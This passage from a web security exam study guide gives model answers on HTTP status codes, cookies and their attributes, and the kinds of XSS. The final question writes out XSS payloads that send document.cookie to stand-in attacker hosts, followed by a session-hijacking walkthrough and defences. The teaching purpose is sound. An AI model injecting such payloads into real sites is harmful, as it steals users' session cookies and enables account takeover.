  5. **5xx (Server Error)**: These status codes signal that the server failed to fulfill a valid request due to an error on the server side. Examples include 500 (Internal Server Error), 502 (Bad Gateway), 503 (Service Unavailable), and 504 (Gateway Timeout).
  
  Understanding these status code families is essential for diagnosing issues in web applications and implementing proper error handling.
</details>

<details>
  <summary>Bullets</summary>
  
  * **1xx (Informational)** - Request received, continuing process
  * **2xx (Success)** - Request successfully received, understood, accepted
  * **3xx (Redirection)** - Further action needed to complete request
  * **4xx (Client Error)** - Request contains errors or cannot be fulfilled
  * **5xx (Server Error)** - Server failed to fulfill valid request
</details>

### 2. **Cookies** are a key part of the HTTP protocol that most web applications rely on. Describe in detail the application and function of cookies in web applications.

<details>
  <summary>Answer</summary>
  
  Cookies are small pieces of data stored on the client's device by the web browser when visiting websites. They function as a state management mechanism for the otherwise stateless HTTP protocol. When a server sends a response to a client, it can include a Set-Cookie header, instructing the browser to store this cookie. On subsequent requests to the same domain, the browser automatically sends back all relevant cookies in the Cookie header.
  
  The primary applications and functions of cookies include:
  
  **Session Management**: Cookies enable servers to recognize users across multiple requests, maintaining session state. Without cookies, users would need to authenticate with every request. Session cookies store session identifiers that link to session data stored on the server.
  
  **Personalization**: Cookies allow websites to remember user preferences, settings, and customizations. This improves user experience by maintaining personalized interfaces or content between visits.
  
  **Tracking and Analytics**: Cookies help website owners gather insights about user behavior, navigation patterns, and site usage. This information is valuable for improving website design and functionality.
  
  **Authentication**: Cookies facilitate "remember me" functionality, allowing users to stay logged in between browser sessions without re-entering credentials.
  
  **Shopping Carts**: E-commerce sites use cookies to maintain shopping cart contents as users navigate through the site.
  
  Cookies have various lifespans: session cookies exist only until the browser is closed, while persistent cookies remain for a specified period. They also have scope limitations through the Domain and Path attributes, restricting where cookies are sent. Modern web security practices include additional protections like the Secure flag (HTTPS only) and HttpOnly flag (inaccessible to JavaScript) to mitigate various attacks.
</details>

<details>
  <summary>Bullets</summary>
  
  * **State management** for stateless HTTP protocol
  * **Session tracking** - maintains user identity across requests
  * **Authentication** - remembers login state
  * **Personalization** - stores user preferences
  * **Shopping carts** - remembers selected items
  * **Analytics** - tracks user behavior and patterns
  * **Created via** Set-Cookie header, sent via Cookie header
  * **Two types**: session cookies (temporary) and persistent cookies (with expiration)
</details>

### 3. In addition to the cookie's actual value, the **Set-Cookie** header can include optional attributes, which can be used to control how the browser handles the cookie. List and explain the purpose each of these optional attributes.

<details>
  <summary>Answer</summary>
  
  The Set-Cookie header supports several optional attributes that control cookie behavior:
  
  **Expires/Max-Age**: Determines the cookie's lifespan. Expires specifies an exact date/time when the cookie should expire, while Max-Age indicates the number of seconds until expiration. Without either attribute, the cookie becomes a session cookie that is deleted when the browser closes.
  
  **Domain**: Specifies which domains can receive the cookie. If omitted, the cookie applies only to the originating domain (excluding subdomains). When specified, the cookie is sent to the specified domain and all its subdomains.
  
  **Path**: Restricts the cookie to specific paths within the domain. If set to "/admin", the cookie is only sent for requests to paths starting with "/admin". The default is "/", which applies to the entire domain.
  
  **Secure**: When present, this flag ensures the cookie is only transmitted over secure (HTTPS) connections, protecting it from interception over insecure channels.
  
  **HttpOnly**: Prevents client-side scripts (JavaScript) from accessing the cookie, mitigating the risk of cross-site scripting (XSS) attacks that attempt to steal cookies.
  
  **SameSite**: Controls whether cookies are sent with cross-site requests, helping protect against cross-site request forgery (CSRF) attacks. Three possible values: Strict (cookies sent only to same site), Lax (cookies sent with GET requests and navigation to the origin site), and None (cookies sent in all contexts, requires Secure attribute).
  
  **Priority** (Chrome only): Suggests relative importance of the cookie (Low, Medium, High) when the browser needs to evict cookies due to storage limits.
  
  **Partitioned** (emerging standard): Creates "partitioned" cookies that are tied to the top-level site being visited, enhancing privacy by preventing cross-site tracking.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Expires/Max-Age** - sets cookie lifetime
  * **Domain** - controls which domains receive cookie
  * **Path** - limits cookie to specific URL paths
  * **Secure** - restricts to HTTPS connections only
  * **HttpOnly** - prevents JavaScript access
  * **SameSite** - controls cross-site sending (Strict/Lax/None)
  * **Priority** - suggests importance when storage limited (Chrome)
  * **Partitioned** - isolates cookies to top-level site context
</details>

## Past Paper 2

### 1. Discuss the gradual shift in focus from **server-side** to **client-side** attacks in recent years. Your answer should include an explanation of the similarities and differences in attacks as well as reason(s) for this change.

<details>
  <summary>Answer</summary>
  
  The cybersecurity landscape has witnessed a notable shift from predominantly server-side attacks to an increased focus on client-side attacks. This evolution reflects changes in web application architecture and security practices.
  
  **Similarities**:
  Both attack vectors ultimately aim to compromise applications and their data. Both exploit vulnerabilities in code or configuration. Both can lead to data breaches, unauthorized access, and system compromise. Additionally, both attack types often leverage input validation failures and can be mitigated through proper security controls.
  
  **Differences**:
  Server-side attacks (like SQL injection and command injection) target application logic running on servers, often seeking direct database access or system-level compromise. They typically focus on back-end technologies and languages (PHP, Java, etc.).
  
  Client-side attacks (like XSS, CSRF, and DOM-based vulnerabilities) execute in the user's browser, targeting front-end code. They often aim to steal sensitive information from users, hijack sessions, or manipulate the user interface. These attacks are more user-focused and occur in the victim's browser context.
  
  **Reasons for the shift**:
  
  1. **Improved server-side security**: Organizations have implemented better server-side security practices, including parameterized queries, WAFs, and code analysis tools, making these attacks more difficult.
  
  2. **Rise of modern web applications**: Modern applications rely heavily on JavaScript frameworks (React, Angular, Vue) that process more logic client-side, expanding the attack surface in browsers.
  
  3. **API-driven architecture**: The shift to microservices and API-based architectures places more functionality in client-side code that consumes these APIs.
  
  4. **Rich user interfaces**: Today's web applications have complex front-ends with extensive client-side processing, creating more potential vulnerabilities.
  
  5. **Browser as a platform**: The browser has evolved into an application platform with powerful capabilities that attackers can abuse when compromised.
  
  This shift requires security professionals to expand their focus to include client-side security controls alongside traditional server-side protections.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Similarities**
    * Both target code vulnerabilities
    * Both seek unauthorized data/function access
    * Both exploit input validation flaws
  
  * **Differences**
    * Server-side: targets back-end, direct DB access
    * Client-side: executes in browser, targets users
    * Different attack techniques and payloads
  
  * **Reasons for shift**
    * Better server-side security implementation
    * JavaScript framework proliferation
    * API-driven architectures
    * Richer client-side functionality
    * Browser as application platform
    * Single-page application growth
</details>

### 2. Explain the difference between a **reflected** and a **stored cross-site scripting** attack. The answer should outline each type of attack.

<details>
  <summary>Answer</summary>
  
  Cross-site scripting (XSS) attacks involve injecting malicious scripts into web pages viewed by other users. The two primary types—reflected and stored XSS—differ in how the malicious payload is delivered and persisted.
  
  **Reflected XSS**:
  
  In a reflected XSS attack, the malicious script is embedded in a request (typically in URL parameters) and "reflected" back in the server's immediate response. This attack is non-persistent, meaning the payload isn't stored on the server and must be delivered to victims through external means.
  
  The attack flow typically involves:
  1. The attacker crafts a URL containing malicious JavaScript code
  2. The victim is tricked into clicking the link (via email, social media, etc.)
  3. The victim's browser sends the request containing the payload to the vulnerable website
  4. The server includes the unvalidated, unescaped input in its response
  5. The victim's browser executes the script in the context of the vulnerable site
  
  Since reflected XSS requires victim interaction with the crafted URL, it often involves social engineering. The impact is limited to users who click the malicious link.
  
  **Stored XSS**:
  
  In stored (or persistent) XSS attacks, the malicious script is submitted to and permanently stored on the target server, usually in a database. The payload is then served to victims whenever they access the affected page.
  
  The attack flow typically involves:
  1. The attacker submits malicious script through a form that stores data (comments, user profiles, etc.)
  2. The server stores the malicious payload in its database
  3. When any user views the page containing the stored payload, their browser executes the script
  
  Stored XSS is generally more dangerous because:
  - It affects all users who view the compromised content
  - It doesn't require social engineering to deliver the payload
  - It persists until administratively removed from the server
  - It may affect users with elevated privileges who access the affected area
  
  Both types require proper input validation, output encoding, and Content Security Policy implementation as defenses.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Reflected XSS**
    * Non-persistent, payload in request, reflected in response
    * Delivered via crafted URLs (email, messages)
    * Requires victim to click malicious link
    * One-time execution per victim interaction
    * Typically exploits input parameter handling
  
  * **Stored XSS**
    * Persistent, payload stored on server (database)
    * Delivered automatically when affected page loaded
    * No user interaction needed beyond visiting page
    * Affects all users accessing infected content
    * Typically exploits content storage features
</details>

### 3. How can a hacker exploit a **XSS vulnerability** to steal session cookies? Provide a suitable payload and explain, step-by-step, how a hacker obtains the cookie of the victim. You may use a diagram to illustrate the steps involved.

<details>
  <summary>Answer</summary>
  
  A cross-site scripting (XSS) vulnerability can be leveraged to steal session cookies when those cookies aren't properly protected. Here's how the attack works:
  
  **Suitable Payload Example**:
  ```javascript
  <script>
  fetch('https://attacker-server.com/steal?cookie='+document.cookie);
  </script>
  ```
  
  Alternative payload using image:
  ```javascript
  <script>
  var img = new Image();
  img.src = 'https://attacker-server.com/steal?cookie='+encodeURIComponent(document.cookie);
  </script>
  ```
  
  **Step-by-Step Process**:
  
  1. **Vulnerability Identification**: The attacker identifies a website vulnerable to XSS, where user input is rendered without proper sanitization.
  
  2. **Payload Injection**: The attacker injects the malicious script into the vulnerable point. This could be through:
     - A comment section (stored XSS)
     - A search field (reflected XSS)
     - A URL parameter (reflected XSS)
  
  3. **Preparation of Collection Server**: The attacker sets up a server (attacker-server.com in the example) configured to receive and log incoming requests, particularly focusing on the query parameters.
  
  4. **Victim Interaction**: 
     - For stored XSS: The victim simply visits the compromised page where the script is stored
     - For reflected XSS: The victim must be tricked into clicking a malicious link
  
  5. **Script Execution**: When the victim loads the page containing the malicious script, their browser executes the JavaScript in the context of the vulnerable website.
  
  6. **Cookie Exfiltration**: The script accesses the document.cookie property (which contains cookies accessible to JavaScript) and sends this data to the attacker's server.
  
  7. **Cookie Collection**: The attacker's server receives and logs the victim's cookies.
  
  8. **Session Hijacking**: The attacker can now use these stolen cookies to impersonate the victim by inserting them into their own browser, effectively hijacking the victim's session.
  
  This attack is particularly effective against sessions that rely solely on cookies for authentication without additional security controls. It can be prevented by using the HttpOnly flag on cookies containing sensitive information, which makes them inaccessible to JavaScript.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Attack Payload**:
    * `<script>fetch('https://attacker.com/steal?c='+document.cookie);</script>`
  
  * **Attack Flow**:
    * Attacker finds XSS vulnerability
    * Attacker sets up collection server
    * Attacker injects cookie-stealing script
    * Victim loads compromised page
    * Script executes in victim's browser context
    * Cookie sent to attacker's server
    * Attacker uses cookie to hijack session
  
  * **Prevention**:
    * HttpOnly flag on sensitive cookies
    * Content-Security-Policy implementation
    * Input validation and output encoding
    * XSS auditing and sanitization
</details>
